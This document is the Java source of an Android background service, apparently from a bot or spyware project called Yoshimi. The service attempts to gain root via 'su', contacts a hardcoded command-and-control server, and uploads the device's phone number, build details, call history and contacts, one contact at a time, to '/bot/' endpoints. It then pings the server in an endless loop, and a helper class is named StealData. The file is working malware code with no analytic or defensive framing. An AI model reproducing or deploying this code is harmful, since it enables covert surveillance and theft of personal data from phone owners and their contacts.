package com.redactedlabs.yoshimi;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import com.redactedlabs.yoshimi.RecentCall;
import com.redactedlabs.yoshimi.StealData;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

public class YoshimiService extends Service {
	
	private static final String TAG = "YoshimiService";
	private static final String CC_SERVER = "http://192.168.1.161:8888";
	private SQLite sqlite;
	private Process proc;
	private String uuid;
	
	@Override
	public void onCreate() {
		Log.d(TAG, "Yoshimi Service created");
		getRoot();
		sqlite = new SQLite(this);
		String query = "SELECT * FROM storage WHERE name = ?";
		Cursor cursor =  sqlite.getReadableDatabase().rawQuery(query, new String[] { "uuid" });
		if (cursor.getCount() == 1) {
			cursor.moveToFirst();
			uuid = cursor.getString(cursor.getColumnIndex("value"));
			Log.d(TAG, "Got uuid from db: " + uuid);
		} else {
			Integer count = cursor.getCount();
			Log.e(TAG, "UUID query returned " + count.toString() + "result(s)");
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		try {
			mainLoop();
		} catch (Exception error) {
			Log.d(TAG, error.toString());
		}
		Log.e(TAG, "Main loop ended?!?");
		return 0;
	}
	
	private void getRoot() {
		try {
			proc = Runtime.getRuntime().exec("su");
			try {
				proc.waitFor();
				if (proc.exitValue() != 255) {
					Log.d(TAG, "Successfully acquired root priviledges!");
				} else {
					Log.d(TAG, "Failed to acquire root priviledges.");
				}
			} catch (InterruptedException error) {
				Log.e(TAG, "Interrupted while attempting to get root: " + error.toString());
			}
		} catch (IOException error) {
			Log.e(TAG, "I/O Error while attempting to get root: " + error.toString());
		}
	}
	
	private void mainLoop() throws InterruptedException {
		Log.d(TAG, "Sending a hello ...");
		String getResponse = Http.GET(CC_SERVER+"/bot/hello", uuid);
		Log.d(TAG, "Yoshimi C&C (GET): " + getResponse);
		/* Send Version and Model */
		Log.d(TAG, "Sending version information ...");
		String postResponse = Http.POST(CC_SERVER+"/bot/version", uuid, getVersionInformation());
		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
		/* Send Call History */
		Log.d(TAG, "Sending call information ...");
		List<NameValuePair> callInfo = getCallInformation();
		if (callInfo != null) {
			postResponse = Http.POST(CC_SERVER+"/bot/calls", uuid, callInfo);
			Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
		}
		/* Send Contacts */
		Log.d(TAG, "Sending contacts information ...");
		getContactsInformation();

		Log.d(TAG, "Starting main loop ...");
		while (true) {
			/* Poll server for commands */
			for (int index = 0; index < 30; index++) {
				Thread.sleep(1000);
				Log.d(TAG, "Still alive!");
			}
			Http.GET(CC_SERVER+"/bot/ping", uuid);
		}
	}
	
	private List<NameValuePair> getVersionInformation() {
		List<NameValuePair> details = new ArrayList<NameValuePair>();
		details.add(new BasicNameValuePair("os_version", System.getProperty("os.version")));
		details.add(new BasicNameValuePair("build_version", android.os.Build.VERSION.INCREMENTAL));
		details.add(new BasicNameValuePair("sdk_version", android.os.Build.VERSION.SDK));
		details.add(new BasicNameValuePair("release_version", android.os.Build.VERSION.RELEASE));
		details.add(new BasicNameValuePair("codename", android.os.Build.VERSION.CODENAME));
		details.add(new BasicNameValuePair("device", android.os.Build.DEVICE));
		details.add(new BasicNameValuePair("model", android.os.Build.MODEL));
		details.add(new BasicNameValuePair("product", android.os.Build.PRODUCT));
		TelephonyManager tMgr = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
		details.add(new BasicNameValuePair("phone_number", tMgr.getLine1Number()));
		return details;
	}
	
	private List<NameValuePair> getCallInformation() {
		Context currentContext = getBaseContext();
		RecentCall[] calls = StealData.getCalls(currentContext);
		if (calls != null) {
			JSONObject jsonCalls = new JSONObject();
			for(Integer index = 0; index < calls.length; index++) {
				try {
					jsonCalls.put(index.toString(), calls[index].getJsonObject());
				} catch (Exception error) {
					Log.d(TAG, "Failed to export call as json: " + error.toString());
				}
			}
			List<NameValuePair> callInfo = new ArrayList<NameValuePair>();
			callInfo.add(new BasicNameValuePair("jsonCalls", jsonCalls.toString()));
			return callInfo;
		} else {
			return null;
		}
	}
	
	private void getContactsInformation() {
		Context currentContext = getBaseContext();
		ContactsList[] contacts = StealData.getContacts(currentContext);
		if (contacts != null) {
			for(Integer index = 0; index < contacts.length; index++) {
				try {
					String contact = contacts[index].getJsonObject();
					List<NameValuePair> contactUpload = new ArrayList<NameValuePair>();
					contactUpload.add(new BasicNameValuePair("jsonContact", contact));
					String response = Http.POST(CC_SERVER+"/bot/contacts", uuid, contactUpload).replaceAll("\\s","");
					if (response.equals("ok")) {
						Log.d(TAG, "Successfully uploaded contact to control server");
					} else {
						Log.e(TAG, "Failed to upload contact (" + response + ")");
					}
				} catch (Exception error) {
					Log.d(TAG, "Failed to export contact as json: " + error.toString());
				}
			}
		} else {
			Log.d(TAG, "No contacts found");
		}
	}
}
